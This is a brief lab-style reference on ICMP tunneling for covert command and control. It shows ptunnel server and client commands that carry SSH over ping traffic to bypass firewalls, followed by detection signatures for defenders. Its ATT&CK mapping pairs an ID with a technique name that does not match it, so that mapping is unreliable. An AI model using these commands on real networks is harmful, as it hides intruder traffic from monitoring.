# ICMP Tunneling C2 - Attacker Reference Guide

This folder documents standard ICMP Tunneling concepts and theoretical usage configurations of tunneling tools against a designated private target (e.g., `192.168.56.20`).

## 1. Overview of ICMP Tunneling
ICMP Tunneling establishes a covert communication channel by encapsulating arbitrary data (such as command shell traffic or application payloads) inside ICMP Echo Request and Echo Reply packets. Because firewalls typically permit standard ping traffic to pass unimpeded, this technique is used to bypass network restrictions or establish Command and Control (C2) persistence. This maps to **MITRE ATT&CK T1048.003 (Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Protocol)**.

## 2. Command Reference

### Tunneling using `ptunnel` (Ping Tunnel)
`ptunnel` tunnels TCP connections over ICMP packets.

#### A. Target (Server) Configuration
Run the tunnel daemon on the target machine:
```bash
sudo ptunnel
```

#### B. Attacker (Client) Configuration
Run the client on the attacker machine to forward a service port (like SSH port 22) through the ICMP tunnel:
```bash
ptunnel -p 192.168.56.20 -lp 8000 -da 127.0.0.1 -dp 22
```
* **`-p 192.168.56.20`**: Specifies the remote tunnel server IP.
* **`-lp 8000`**: Sets the local port on the attacker machine to bind the tunnel.
* **`-da 127.0.0.1`**: Specifies target destination address relative to the server.
* **`-dp 22`**: Specifies target destination port (SSH).

#### C. Accessing service
The attacker can now connect to SSH locally, sending the traffic through ICMP:
```bash
ssh -p 8000 user@127.0.0.1
```

## 3. Network Detection Signatures
* Extremely high frequency of ICMP Echo Requests and Replies between two hosts without normal timing gaps.
* ICMP packet payload sizes that are unusually large or do not match standard system ping sequences (standard Linux ping packets typically carry a payload containing a structured ASCII alphabet sequence: `abcdefghijklmnopqrstuvw...`).
* Inbound and outbound packets possessing identical ICMP sequence numbers containing varied payload data.
